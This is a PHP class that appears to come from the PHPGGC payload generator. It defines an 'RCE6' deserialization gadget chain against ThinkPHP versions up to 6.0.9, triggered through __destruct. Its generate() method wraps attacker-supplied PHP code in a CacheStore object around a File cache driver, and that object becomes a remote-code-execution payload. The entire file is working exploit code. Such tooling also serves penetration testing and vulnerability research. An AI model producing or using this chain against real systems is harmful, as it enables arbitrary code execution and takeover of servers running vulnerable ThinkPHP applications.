<?php

namespace GadgetChain\ThinkPHP;

class RCE6 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '? <= 6.0.9';
    public static $vector = '__destruct';
    public static $author = '???';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        $file = new \think\cache\driver\File();

        $cache = new \think\filesystem\CacheStore($code,$file);
        return $cache;
    }
}